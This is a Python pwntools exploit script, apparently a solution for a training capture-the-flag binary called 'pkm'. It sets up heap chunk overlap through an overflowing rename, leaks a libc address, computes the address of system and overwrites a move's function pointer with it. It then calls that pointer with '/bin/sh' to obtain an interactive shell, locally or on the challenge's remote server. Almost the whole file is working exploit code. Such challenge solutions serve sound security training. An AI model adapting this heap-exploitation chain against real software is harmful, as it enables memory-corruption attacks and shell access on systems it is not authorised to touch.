from pwn import *

CHALL_PATH = './pkm_patched'
CHALL = ELF(CHALL_PATH)
COMMANDS = """
b *fight_pkm
c
"""

LIBC_BASE_OFFSET = 0x6f6a0
SYSTEM_OFFSET = 0x453a0

def add_pkm(c):
    c.recvuntil(b'> ')
    c.sendline(b'0')
    line = c.recvline()
    print(line)

def rename_pkm(c, pkm_number, length, name):
    c.recvuntil(b'> ')
    c.sendline(b'1')
    c.recvuntil(b'> ')
    c.sendline(str(pkm_number).encode())
    c.recvuntil(b': ')
    c.sendline(str(length).encode())
    c.sendline(name)

def kill_pkm(c, pkm_number):
    c.recvuntil(b'> ')
    c.sendline(b'2')
    c.recvuntil(b'> ')
    c.sendline(str(pkm_number).encode())
    
def info_pkm(c, pkm_number):
    c.recvuntil(b'> ')
    c.sendline(b'4')
    c.recvuntil(b'> ')
    c.sendline(str(pkm_number).encode())
    c.recvuntil(b" *Name: ")
    time.sleep(0.1)
    leaked_addr = c.read(6)
    time.sleep(0.1)
    return leaked_addr
    
def fight_pkm(c, pkm_1, pkm_2, move):
    c.recvuntil(b'> ')
    c.sendline(b'3')
    c.recvuntil(b'> ')
    c.sendline(str(pkm_1).encode())
    c.recvuntil(b'> ')
    c.sendline(str(move).encode())
    c.recvuntil(b'> ')
    c.sendline(str(pkm_2).encode())


if args.REMOTE:
    c = remote('pkm.training.offensivedefensive.it', 8080, ssl = True)
    
elif args.GDB:
    c = gdb.debug(CHALL_PATH, COMMANDS)

else:
    c = process(CHALL_PATH)
    

add_pkm(c) # 0
add_pkm(c) # 1
add_pkm(c) # 2
add_pkm(c) # 3
add_pkm(c) # 4

rename_pkm(c, 0, 512, "A"*512) # --> A
rename_pkm(c, 1, 512, "B"*496 + "\x11\x01" + "\x00"*14) # --> B
rename_pkm(c, 2, 512, "C"*512) # --> C

kill_pkm(c, 1) #here I kill B and its name string
add_pkm(c) #1 to replace the empty slot where pkm b was before (otherwise the string is put there)

rename_pkm(c, 0, 520, "D"*520) # A overflows into B
rename_pkm(c, 3, 240, "E"*240) # Creation of B1
add_pkm(c) #5 --> B2
kill_pkm(c, 3) #kill B1
kill_pkm(c, 2) #Kill C
add_pkm(c) #2 to replace the slot of pkm C
add_pkm(c) #3 to replace the slot of pkm B1(3)

# overlap done  
                                                                                                            
PUTS = 0x602020
TACKLE_STRING = 0x60127f
TACKE = 0x400826                                                                                                     

payload = "Z"*768 + "\x00\x01\x00\x00\x00\x00\x00\x00" + "\x00\x01\x00\x00\x00\x00\x00\x00" + "\x28" + "\x00"*7 + "\x3F" + "\x00"*7 + "\x64" + "\x00"*7 + "\x64" + "\x00"*7 + "\x00"*8 + "\x20\x20\x60" + "\x00"*5 + "\x05" + "\x00"*39 + "\x7F\x12\x60" + "\x00"*5 + "\x26\x08\x40" + "\x00"*5 + "\x00"*8 + "\x91\x03" + "\x00"*5
rename_pkm(c, 0, 903, payload) # write inside B2 especially the moves
leaked_addr = info_pkm(c, 5)
print(leaked_addr)
leaked_addr = u64(leaked_addr.ljust(8, b"\x00"))
print(hex(leaked_addr))
one_gadget_addr = leaked_addr - LIBC_BASE_OFFSET + SYSTEM_OFFSET
one_gadget_addr = p64(one_gadget_addr)

payload = b"Z"*768 + b"\x00\x01\x00\x00\x00\x00\x00\x00"*2 + b"/bin/sh\x00" + b"\x3F" + b"\x00"*7 + b"\x64" + b"\x00"*7 + b"\x64" + b"\x00"*7 + b"\x00"*8 + b"\x20\x20\x60" + b"\x00"*5 + b"\x05" + b"\x00"*39 + b"\x7F\x12\x60" + b"\x00"*5 + one_gadget_addr + b"\x00"*144
rename_pkm(c, 0, 1032, payload)
fight_pkm(c, 5, 2, 0)

c.interactive()
